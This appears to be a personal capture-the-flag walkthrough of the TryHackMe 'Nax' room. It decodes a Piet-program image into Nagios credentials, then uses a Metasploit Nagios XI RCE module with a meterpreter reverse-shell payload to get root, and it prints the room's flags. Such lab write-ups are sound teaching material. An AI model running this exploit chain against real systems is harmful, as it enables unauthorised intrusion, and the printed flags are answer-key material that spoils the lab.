//this one was a bit tough for me

//after enumeration and connection on wesite we get a weird page with "elements"
//periodic table elements Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr

//the corresponding numbers (atomic value) are found on google and we ceck if those are ASCII chars:

python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"
/PI3T.PNg

//A hidden png? lets go get that and extract exif data from it first
exiftool /home/nair0lf32/Desktop/Stuff/THM/Nax/PI3T.PNg
ExifTool Version Number         : 12.16
File Name                       : PI3T.PNg
Directory                       : /home/nair0lf32/Desktop/Stuff/THM/Nax
File Size                       : 959 KiB
File Modification Date/Time     : 2021:11:02 00:29:28+01:00
File Access Date/Time           : 2021:11:02 00:29:28+01:00
File Inode Change Date/Time     : 2021:11:02 00:29:28+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 990
Image Height                    : 990
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 768 bytes, use -b option to extract)
Transparency                    : (Binary data 256 bytes, use -b option to extract)
Artist                          : Piet Mondrian
Copyright                       : Piet Mondrian, tryhackme 2020
Image Size                      : 990x990
Megapixels                      : 0.980

//googling piet mondrian didnt really help me...so I started to look for steganograpy methods
//SEEMS LIKE A LANGUAGE CALLED PIET WAS CREATED AFTER THE AUTHOR'S ...let's google PIET

//there is an online tool to execute that at https://www.bertnase.de/npiet/npiet-execute.php

libpng warning: Extra compressed data.
libpng warning: Extra compression data.
nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYna

//from that horribly long sequence we notice its just credentials repeated with url encoded like separator (%)
//so we get
nagiosadmin:n3p3UQ&9BjLp4$7uhWdY

//we can use that to login at nagios 

Nagios XI 5.5.6

//lets google it...and it seems that its an interresting one
CVE-2019-15949 : CRITICAL RCE to root with getprofile.sh
CVE-2018-15708 : CRITICAL remote command execution
CVE-2018-15710 : HIGH privilege escalation via Autodiscover_new.php.

//first one is the most critical
//we fire metasploit up and use xploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

Name            Current Setting       Required  Description
----            ---------------       --------  -----------
FINISH_INSTALL  false                 no        If the Nagios XI installation has not been completed, try to do so. This includes signing the license agreement.
PASSWORD        n3p3UQ&9BjLp4$7uhWdY  yes       Password to authenticate with
Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS          10.10.79.218          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
RPORT           80                    yes       The target port (TCP)
SRVHOST         0.0.0.0               yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT         8080                  yes       The local port to listen on.
SSL             false                 no        Negotiate SSL/TLS for outgoing connections
SSLCert                               no        Path to a custom SSL certificate (default is randomly generated)
TARGETURI       /nagiosxi/            yes       The base path to the Nagios XI application
URIPATH                               no        The URI to use for this exploit (default is random)
USERNAME        nagiosadmin           yes       Username to authenticate with
VHOST                                 no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST  10.8.226.203     yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port


Exploit target:

Id  Name
--  ----
1   Linux (x64)

//and we get a meterpreter session
//we go /home/galand for first flag
meterpreter > cat user.txt
THM{84b17add1d72a9f2e99c33bc568ae0f1}

//time for more privileges...haha joking..not this time...we already root (most critical RCE vuln)
meterpreter > getuid
Server username: root

meterpreter > cat root.txt
THM{c89b2e39c83067503a6508b21ed6e962}


//that was a CRITICAL hit
